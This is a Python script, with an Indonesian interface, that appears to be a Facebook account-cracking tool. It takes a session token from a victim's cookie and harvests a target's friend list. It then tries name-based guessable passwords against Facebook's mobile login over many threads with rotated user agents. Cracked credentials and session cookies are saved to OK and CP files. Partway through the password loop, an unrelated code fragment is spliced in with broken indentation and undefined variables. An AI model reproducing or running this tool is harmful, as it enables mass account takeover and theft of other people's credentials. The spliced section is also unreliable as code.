            "Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36"
             
			"Dalvik/2.1.0 (Linux; U; Android 7.0.0; Redmi 5A Build/OPM3.171019.016)"
			"Dalvik/2.1.0 (Linux; U; Android 7.1.1; CPH1719 Build/OPM2.171019.029)"
			"Dalvik/2.1.0 (Linux; U; Android  8.1.1; vivo 1612 Build/NRD90M)"
			"Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 5A Build/RP1A.200720.011)"
			"Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])"
			
			
			
			)

		head = {

			"User-Agent": lnux

			}

		link = ses.get(

			"https://web.facebook.com/adsmanager?_rdc=1&_rdr",

			headers=head,

			cookies = {

				"cookie" : cok

				}

			)

		find = re.findall(

			'act=(.*?)&nav_source',

			link.text

			)

		if len(find)==0: 

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]cookie anda invalid",

					width=48,

					style="bold purple",

					),

				justify="center"

				)

			sleep(

				2

				)

			exit(

			)

		else:

			for x in find:

				xz = ses.get(

					"https://web.facebook.com/adsmanager/manage/campaigns?act="+x+"&nav_source=no_referrer",

					headers = head,

					cookies = {

						"cookie" : cok

						}

					)

				took = re.search(

					'(EAAB\w+)',

					xz.text

					).group(

						1

					)

				open(

					".tok.txt",

					"w"

					).write(

						took

					)

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]token facebook anda",

						style="bold purple",

						),

					justify="center"

				)

				Console(

					).print(

						f"[bold white]{took}"

					)

				Console(width=48).print(

					Panel("[bold #FF00D4]login cookie berhasil",

					style="bold purple",

					),

				justify="center"

				)

				Ikuti_Boleh_Ya(

					cok

				)

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]enter untuk ke menu",

						width=48,

						subtitle="╭──",

						subtitle_align="left",

						style="bold purple",

						),

					justify="center"

				)

				Console().input(

					"[bold purple]   ╰─> "

					)

				Back_Menu(

				)

	except (Exception) as e:

		exit(

			e

		)

def Main_Menu():

	try:

		token = open(

			'.tok.txt',

			'r'

		).read()

		cok = open(

			'.cok.txt',

			'r'

		).read()

	except (IOError, FileNotFoundError):

		Console(width=48).print(

			Panel(

				'[bold red]cookies anda kadaluarsa',

				style="bold purple",

				),

			justify="center"

		)

		sleep(

			2

			)

		Login_Dulu(

		)

	try:

		data_efbi = requests.get(

			f"https://graph.facebook.com/me?fields=name,id&access_token={token}",

			cookies = {

				'cookie'

				 :  

				 cok

			}

		).json()

		nama_fb = data_efbi[

			'name'

		]

		uids_fb = data_efbi[

			'id'

		]

	except (requests.exceptions.ConnectionError):

			Console(width=48).print(

				Panel(

					"[bold purple]* [bold #FF00D4]error 404, jaringan lemot![bold purple] *",

					width=48,

					style="bold purple",

					),

				justify="center",

				)

			exit(

			)

	except (KeyError):

		try:

			os.remove(

				".cok.txt"

				)

			os.remove(

				".tok.txt"

			)

		except:

			pass

		Login_Dulu(

		)

	Bersih(

		)

	Banner(

	)

	Colom1 = [

]

	Colom1.append(

		Panel(

			f"[bold #FF00D4]id: {uids_fb}",

			width=23,

			style="bold purple",

		)

	)

	Colom1.append(

		Panel(

			f"[bold #FF00D4]nama: {nama_fb}",

			width=24,

			style="bold purple",

		)

	)

	Console(width=48).print(

		Columns(

			Colom1

			),

		justify="center"

	)

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]input menu (1/2)",

			style="bold purple",

			),

		justify="center"

	)

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]1.dump friendlist    2.cek hasil ok cp",

			width=48,

			subtitle="╭──",

			subtitle_align="left",

			style="bold purple",

			),

		justify="center"

	)

	Pilih = Console().input(

		"[bold purple]   ╰─> "

	)

	if Pilih in ("1"):

		Console(width=48).print(

			Panel(

				"[bold #FF00D4]input id target",

				width=48,

				subtitle="╭──",

				subtitle_align="left",

				style="bold purple",

				),

			justify="center"

		)

		idt = Console().input(

			"[bold purple]   ╰─> "

			)

		Start_Dump(idt, "", {"cookie": cok}, token)

		Sortir_Idz(

		)

	elif Pilih in ("2"):

		Hasil_OkCp(

		)

	else:

		Console(width=48).print(

			Panel(

				"[bold #FF00D4]macam tak betul budek ni",

				width=48,

				style="bold purple",

				),

			justify="center"

		)

	sleep(

		2

		)

	exit(

	)

def Start_Dump(idt, fields, cookie, token):

	ses = requests.Session()

	try:

		head = {

			"connection": "keep-alive",

			"accept": "*/*",

			"sec-fetch-dest": "empty",

			"sec-fetch-mode": "cors",

			"sec-fetch-site": "same-origin",

			"sec-fetch-user": "?1",

			"sec-ch-ua-mobile": "?1",

			"upgrade-insecure-requests": "1",

			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",

			"accept-encoding": "gzip, deflate",

			"accept-language": "id-ID,id;q=0.9",

			}

		if len(id) == 0:

			param = {

				"access_token": token,

				"fields": f"name,friends.fields(id,name,birthday)",

			}

		else:

			param = {

				"access_token": token,

				"fields": f"name,friends.fields(id,name,birthday).after({fields})",

			}

		url = ses.get(

			f"https://graph.facebook.com/{idt}",

			params=param,

			headers=head,

			cookies=cookie,

		).json()

		for i in url["friends"]["data"]:

			id.append(i["id"] + "|" + i["name"])

			print(f"       ╰─> sedang mengumpulkan {len(id)} id         ",end="\r")

		Start_Dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)

	except :

		pass

def Sortir_Idz():

	if len(id) == 0:

		Console(width=48).print(

			Panel(

				"[bold #FF00D4]id privat/ttl -18th",

				style="bold purple",

				),

			justify="center"

			)

		exit(

		)

	muda = [

]

	for bacot in sorted(id):

		muda.append(

			bacot

		)

	bcm = len(

		muda

	)

	bcmi = (

		bcm-1

		)

	for xmud in range(bcm):

		id2.append(

			muda[

				bcmi

			]

		)

		bcmi -=1

	Console(width=48).print(

		Panel(

			f"[bold #FF00D4]terkumpul {len(id)} id",

			style="bold purple",

			),

		justify="center"

		)

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]tambah kata sandi (y/t)",

			width=48,

			subtitle="╭──",

			subtitle_align="left",

			style="bold purple",

			),

		justify="center"

		)

	pwa = Console().input(

		"[bold purple]   ╰─> "

		)

	if pwa in ["y", "Y"]:

		pwp.append(

			"bade"

			)

		Console(width=48).print(

			Panel(

				"[bold #FF00D4]example: password,facebook,rahasia",

				width=48,

				subtitle="╭──",

				subtitle_align="left",

				style="bold purple",

				),

			justify="center"

			)

		pwn = Console().input(

			"[bold purple]   ╰─> "

			)

		pwk = pwn.split(

			","

			)

		for xpw in pwk:

			pwt.append(

				xpw

			)

	else:

		pwp.append(

			"moal"

		)

	Eksekusi(

	)

def Eksekusi():

	global prog, des

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]mode pesawat per 300 id",

			width=48,

			subtitle="[bold #FF00D4]* <[bold purple][underline]hasil akun ok dan cp tersimpan di[/underline][bold #FF00D4]> *",

			style="bold purple",

			),

		justify="center"

	)

	Colom2 = [

]

	Colom2.append(

		Panel(

			f"[bold #00FF00] {okc}",

			width=23,

			style="bold purple",

		)

	)

	Colom2.append(

		Panel(

			f"[bold #FFFF00] {cpc}",

			width=24,

			style="bold purple",

		)

	)

	Console(width=48).print(

		Columns(

			Colom2

			),

		justify="center"

	)

	prog = Progress(

		SpinnerColumn(

			'clock'

		),

		TimeElapsedColumn(

		),

		TextColumn(

			'{task.percentage:.0f}%'

		),

		TextColumn(

			'{task.description}'

		),

		# BarColumn(

		# )

	)

	des = prog.add_task(

		'',

		total = len(

			id2

		)

	)

	with prog:

		with Trd(max_workers=30) as MethodCrack:

			for mxv in id2:

				user = mxv.split(

					'|'

					)[

					0

				]

				nmfl = mxv.split(

					'|'

					)[

					1

				].lower()

				namd = nmfl.split(

					' '

					)[

					0

				]

				namx = nmfl.replace(

					' ',

					''

				)

				pasw = [

					'kamu nanya',

					'kamunanya',

					'kata sandi'

				]

				if len(nmfl) and len(namx) < 6:

					if len(namd) < 3:

						pass

					else:

						pasw.append(

							nmfl

						)

						pasw.append(

							namx

						)

						pasw.append(

							namd

							+

							namd

						)

						pasw.append(

							namd

							+

							' '

							+

							namd

						)

						pasw.append(

							namd

							+

							'12'

						)

						pasw.append(

							namd

							+

							'123'

						)

						pasw.append(

							namd

							+

							'1234'

						)

						pasw.append(

							namd

							+

							'12345'

						)

						pasw.append(

							namd

							+

							'123456'

						)

				else:

					if len(namd) < 3:

						pasw.append(

							nmfl

							)

						pasw.append(

							namx

						)

					else:

						pasw.append(

							nmfl

							)

						pasw.append(

							namx

						)

						pasw.append(

							namd

							+

							namd

						)

						pasw.append(

							namd

							+

							' '

							+

							namd

						)

						pasw.append(

							namd

							+

							'12'

						)

						pasw.append(

							namd

							+

							'123'

						)

						pasw.append(

							namd

							+

							'1234'

						)

						pasw.append(

							namd

							+

							'12345'

						)

						pasw.append(

							namd

							+

							'123456'

				    	)

						pasw.append(

							namd

							+

						  '@'
						)

						pasw.append(

							namd

							+

							'@#$'
							)

						pasw.append(

							namd

							+

							'@#$_&+_?*'
							)

						pasw.append(

							namd

							+

							'@#$_&-+()/'
							)

						pasw.append(

							namd

							+

							'@#$_&-+()/*":;!?.,'
		  else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'01')
						pwx.append(frestile+'02')
						pwx.append(frestile+'03')
						pwx.append(frestile+'04')
						pwx.append(frestile+'05')
						pwx.append(frestile+'06')
						pwx.append(frestile+'07')
						pwx.append(frestile+'08')
						pwx.append(frestile+'09')
						pwx.append(frestile+'00')
						pwx.append(frestile+'000')
                	if 'bade' in pwp:

					for xpwd in pwt:

						pasw.append(

							xpwd

						)

				else:

					pass

				MethodCrack.submit(

					Valid,

					user,

					pasw,

					nmfl

				)

		print(

		)

	Console(width=48).print(

		Panel(

			f'[bold #FF00D4]crack selesai akun ok: [bold #00FF00]{ok} [bold #FF00D4]akun cp: [bold #FFFF00]{cp}',

			width=48,

			style=f"bold purple"

			),

		justify="center"

		)

	exit(

	)

def Konversi(cookie):

	kueh = (

		'datr=%s;sb=%s;ps_l=0;ps_n=0;c_user=%s;xs=%s;fr=%s'

		%

		(

			cookie[

				'datr'

			],

			cookie[

				'sb'

			],

			cookie[

				'c_user'

			],

			cookie[

				'xs'

			],

			cookie[

				'fr'

			]

		)

	)

	return(

		str(

			kueh

		)

	)

def Valid(user,pasw,nmfl):

	global loop,ok,cp

	prog.update(des,description=f"[bold #FF00D4]{loop}[bold #FFFFFF]=[bold #FF00D4]{len(id)} [bold ##FFFFFF]{user} [bold #FFFFFF]ok:[bold #80FF00]{ok}[bold #FFFFFF] cp:[bold #FFFF00]{cp}[/]")

	prog.advance(des)

	for pw in pasw:

		try:

			ses = requests.Session(); ua = User_Agent()

			# xxx = open('p.txt','r').read().splitlines()

			# zzz = {'http': 'socks5://'+random.choice(xxx)}

			url = (f'{rc(["free","mbasic","m"])}.prod.facebook.com')

			bhs = rc(['id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'bd-BD,bd;q=0.9,en-US;q=0.8,en;q=0.7', 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7', 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'])

			link = ses.get("https://"+url+"/login.php?skip_api_login=1&api_key=285562428300787&kid_directed_site=0&app_id=285562428300787&signed_next=1&next=https%3A%2F%2F"+url+"%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")

			date = {

				"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),

				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),

				"uid": user,

				"next": "https://"+url+"/login/save-device/",

				"flow": "login_no_pin",

				"pass": pw,}

			kueh = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])

			head = {

				'Host': url,

				'cache-control': 'max-age=0',

				'upgrade-insecure-requests': '1',

				'origin': 'https://'+url,

				'content-type': 'application/x-www-form-urlencoded',

				'x-requested-with': 'XMLHttpRequest',

				'user-agent': ua,

				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

				'sec-fetch-site': 'same-origin',

				'sec-fetch-mode': 'navigate',

				'sec-fetch-user': '?1',

				'sec-fetch-dest': 'document',

				'dpr': str(rr(1,5)),

				'viewport-width': str(rr(300,999)),

				'sec-ch-ua': '"Not)A;Brand";v="{}", "Chromium";v="{}"'.format(str(rr(8,24)), re.search(r'Chrome/(\d+)', str(ua)).group(1)),

				'sec-ch-ua-mobile': '?1',

				'sec-ch-ua-platform': '"Android"',

				'sec-ch-ua-platform-version': '"{}.0.0"'.format(re.search(r'Android (\d+)', ua).group(1)),

				'sec-ch-ua-full-version-list': '"Not)A;Brand";v="{}.0.0.0", "Chromium";v="{}"'.format(str(rr(8,24)), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua)).group(1)),

				'sec-ch-prefers-color-scheme': 'dark',

				'referer': link.url,

				'accept-encoding': 'gzip, deflate, br',

				'accept-language': bhs,}

			sign = ses.post('https://'+url+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',

				data = date,

				headers = head,

				cookies = {

					'cookie'

					:

					kueh

				},

				allow_redirects = False)

			if "checkpoint" in ses.cookies.get_dict():

				tree = Tree(

					"",

					guide_style="bold purple"

				)

				true = tree.add(

					Panel(

						"[bold #FFFF00]login akun facebook cekpoint",

						subtitle="* ᴅᴀᴛᴀ *",

						subtitle_align="left",

						width=32,

						style="bold purple"

					)

				).add(

					f"[bold #FFFF00]ᴜʀʟᴡᴇʙ: [#FFFFFF]{url}"

					,style="bold purple"

				)

				true.add(

					f"[bold #FFFF00]ɴɴ: [#FFFFFF]{nmfl}",

					style="bold purple"

				)

				true.add(

					f"[bold #FFFF00]ɪᴅ: [#FFFFFF]{user}",

					style="bold purple"

				)

				true.add(

					f"[bold #FFFF00]ᴘᴡ: [#FFFFFF]{pw}",

					style="bold purple"

				)

				true = tree.add(

					Panel(

						f"[bold #FF00D4]{ua}",

						title="* ᴜɢᴇɴ *",

						title_align="left",

						width=84,style="bold purple"

					)

				)

				true.add(

					Panel(

						"[bold #FFFF00]silahkan check di lite/mbasic barangkali opsi checkpointnya dapat dibuka!",

						title="* ɪɴғᴏ *",

						title_align="left",

						width=80,

						style="bold purple"

					)

				)

				Cetak(

					tree

				)

				open(

					'CP/'

					+

					cpc,

					'a'

					).write(

					user

					+

					'|'

					+

					pw

					+

					'\n'

				)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict():

				kuki = Konversi(

					ses.cookies.get_dict()

				)

				tree = Tree(

					"",

					guide_style="bold purple"

				)

				true = tree.add(

					Panel(

						"[bold #00FF00]login akun facebook berhasil",

						subtitle="* ᴅᴀᴛᴀ *",

						subtitle_align="left",

						width=32,

						style="bold purple"

					)

				).add(

					f"[bold #00FF00]ᴜʀʟᴡᴇʙ: [#FFFFFF]{url}"

					,style="bold purple"

				)

				true.add(

					f"[bold #00FF00]ɴɴ: [#FFFFFF]{nmfl}",

					style="bold purple"

				)

				true.add(

					f"[bold #00FF00]ɪᴅ: [#FFFFFF]{user}",

					style="bold purple"

				)

				true.add(

					f"[bold #00FF00]ᴘᴡ: [#FFFFFF]{pw}",

					style="bold purple"

				)

				true = tree.add(

					Panel(

						f"[bold #FF00D4]{ua}",

						title="* ᴜɢᴇɴ *",

						title_align="left",

						width=84,style="bold purple"

					)

				)

				true.add(

					Panel(

						f"[bold #00FF00]{kuki}",

						title="* ᴋᴜᴇʜ *",

						title_align="left",

						width=80,

						style="bold purple"

					)

				)

				Cetak(

					tree

				)

				open(

					'OK/'

					+

					okc,

					'a'

					).write(

					user

					+

					'|'

					+

					pw

					+

					'|'

					+

					kuki

					+

					'|'

					+

					ua

					+

					'\n'

				)

				ok+=1

				break

			else: continue

		except (requests.exceptions.ConnectionError): sleep(30)

	loop +=1

def Hasil_OkCp():

	Colom3 = [

	]

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]menu cek hasil crack",

			style="bold purple",

			),

		justify="center"

		)

	Colom3.append(

		Panel(

			"[bold #FF00D4] 1.hasil ok",

			width=15,

			style="bold purple",

		)

	)

	Colom3.append(

		Panel(

			"[bold #FF00D4] 2.hasil cp",

			width=16,

			style="bold purple",

		)

	)

	Colom3.append(

		Panel(

			"[bold #FF00D4] 3.kembali",

			width=15,

			style="bold purple",

		)

	)

	Console(width=48).print(

		Columns(

			Colom3

			),

		justify="center"

	)

	Console(width=48).print(

		Panel(

			'[bold #FF00D4]input menu (1/2/3)',

			width=48,

			subtitle="╭──",

			subtitle_align="left",

			style="bold purple"

			),

		justify="center"

	)

	Choose = Console().input(

		'[bold purple]   ╰─> '

		)

	if Choose in ('1'):

		try:

			Cari = os.listdir(

				'OK'

			)

		except FileNotFoundError:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]file tidak ada",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			sleep(

				3

				)

			Back_Menu(

			)

		if len(Cari) == 0:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]file kosong, crack dahulu",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			sleep(

				2

				)

			Back_Menu(

			)

		else:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]daftar hasil akun ok anda",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			Htg = 0

			Fns = {}

			for Data in Cari:

				try:

					Isi = open('OK/'+Data,'r').readlines()

				except:

					continue

				Htg+=1

				if Htg < 10:

					Nom = (

						''

						+

						str(

							Htg

						)

					)

					Fns.update(

						{

							str(

								Htg

							)

							:

							str(

								Data

							)

						}

					)

					Fns.update(

						{

							Nom

							:

							str(

								Data

							)

						}

					)

					Console().print(

						'[bold #FF00D4] ➛ [#FFFFFF]0'

						+

						Nom

						+

						'[#FFFFFF]. '

						+

						Data

						+

						'[bold #00FF00] '

						+

						str(

							len(

								Isi

							)

						)

						+

						'[#FFFFFF] akun'

					)

				else:

					Fns.update(

						{

							str(

								Htg

							)

							:

							str(

								Data

							)

						}

					)

					Console().print(

						'[bold #FF00D4] ➛ [#FFFFFF]'

						+

						str(

							Htg

						)

						+

						'. '

						+

						Data

						+

						'[bold #00FF00] '

						+

						str(

							len(

								Isi

							)

						)

						+

						'[#FFFFFF] akun'

					)

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]input nomer daftar hasil diatas",

					width=48,

					subtitle="╭──",

					subtitle_align="left",

					style="bold purple"

					),

				justify="center"

			)

			View = Console().input(

				'[bold purple]   ╰─> '

				)

			try:

				Liat = Fns[

					View

				]

			except KeyError:

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]macam tak betul budek ni",

						width=48,

						style="bold purple"

						),

					justify="center"

				)

				sleep(

					2

					)

				Back_Menu(

				)

			try:

				Cari2 = open(

					'OK/'

					+

					Liat,

					'r'

				).read().splitlines()

			except:

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]file tidak ada",

						width=48,

						style="bold purple"

						),

					justify="center"

				)

				sleep(

					2

					)

				Back_Menu(

				)

			HtgCp = 0

			for Cpku in range(len(Cari2)):

				Cpny = Cari2[

					HtgCp

					].split('|')

				tree = Tree(

					""

				)

				tree.add(

					"\r[bold #00FF00]Account Succesfully"

					).add(

					f"\r[bold purple]{Cpny[0]}|{Cpny[1]}"

					).add(

					f"\r[bold purple]{Cpny[2]}"

					,style="bold white"

				)

				tree.add(

					f"\r[white]{Cpny[3]}"

					,style="bold #00FF00"

				)

				Cetak(

					tree

				)

				HtgCp +=1

			print(

				''

			)

			Console(width=48).print(

				Panel(

					'[bold #FF00D4]cek selesai, enter untuk ke menu',

					width=48,

					subtitle="╭──",

					subtitle_align="left",

					style="bold purple"

					),

				justify="center"

			)

			Console().input(

				'[bold purple]   ╰─> '

				)

			Back_Menu(

			)

	elif Choose in ('2'):

		try:

			Cari = os.listdir(

				'CP'

			)

		except FileNotFoundError:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]file tidak ada",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			sleep(

				3

				)

			Back_Menu(

			)

		if len(Cari) == 0:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]file kosong, crack dahulu",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			sleep(

				2

				)

			Back_Menu(

			)

		else:

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]daftar hasil akun cp anda",

					width=48,

					style="bold purple"

					),

				justify="center"

			)

			Htg = 0

			Fns = {}

			for Data in Cari:

				try:

					Isi = open('CP/'+Data,'r').readlines()

				except:

					continue

				Htg+=1

				if Htg < 10:

					Nom = (

						''

						+

						str(

							Htg

						)

					)

					Fns.update(

						{

							str(

								Htg

							)

							:

							str(

								Data

							)

						}

					)

					Fns.update(

						{

							Nom

							:

							str(

								Data

							)

						}

					)

					Console().print(

						'[bold #FF00D4] ➛ [bold #FFFFFF]0'

						+

						Nom

						+

						'[#FFFFFF]. '

						+

						Data

						+

						'[bold #FFF000] '

						+

						str(

							len(

								Isi

							)

						)

						+

						'[#FFFFFF] akun'

					)

				else:

					Fns.update(

						{

							str(

								Htg

							)

							:

							str(

								Data

							)

						}

					)

					Console().print(

						'[bold #FF00D4] ➛ [#FFFFFF]'

						+

						str(

							Htg

						)

						+

						'. '

						+

						Data

						+

						'[bold #FFF000] '

						+

						str(

							len(

								Isi

							)

						)

						+

						'[#FFFFFF] akun'

					)

			Console(width=48).print(

				Panel(

					"[bold #FF00D4]input nomer daftar hasil diatas",

					width=48,

					subtitle="╭──",

					subtitle_align="left",

					style="bold purple"

					),

				justify="center"

			)

			View = Console().input(

				'[bold purple]   ╰─> '

			)

			try:

				Liat = Fns[

					View

				]

			except KeyError:

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]macam tak betul budek ni",

						width=48,

						style="bold purple"

						),

					justify="center"

				)

				sleep(

					2

					)

				Back_Menu(

				)

			try:

				Cari2 = open(

					'CP/'

					+

					Liat,

					'r'

				).read().splitlines()

			except:

				Console(width=48).print(

					Panel(

						"[bold #FF00D4]file tidak ada",

						width=48,

						style="bold purple"

						),

					justify="center"

				)

				sleep(

					2

					)

				Back_Menu(

				)

			HtgCp = 0

			for Cpku in range(len(Cari2)):

				Cpny = Cari2[

					HtgCp

					].split('|')

				tree = Tree("")

				tree.add(

					"\r[bold #FFFF00]Account Checkpoint"

					).add(

					f"\r[bold #FF0000]{Cpny[0]}|{Cpny[1]}"

					,style="bold #FFF000"

				)

				Cetak(

					tree

				)

				HtgCp +=1

			print(

				''

			)

			Console(width=48).print(

				Panel(

					'[bold #FF00D4]cek selesai, enter untuk ke menu',

					width=48,

					subtitle="╭──",

					subtitle_align="left",

					style="bold purple"

					),

				justify="center"

			)

			Console().input(

				'[bold purple]   ╰─> '

				)

			Back_Menu(

			)

	elif Choose in ('3'):

		Back_Menu(

		)

	else:

		Console(width=48).print(

			Panel(

				"[bold #FF00D4]macam tak betul budek ni",

				width=48,

				style="bold purple"

				),

			justify="center"

		)

		sleep(

			1

			)

		exit(

	)

if __name__=='__main__':

	try:

		os.mkdir(

			'OK'

		)

	except:

		pass

	try:

		os.mkdir(

			'CP'

		)

	except:

		pass

	Main_Menu(

)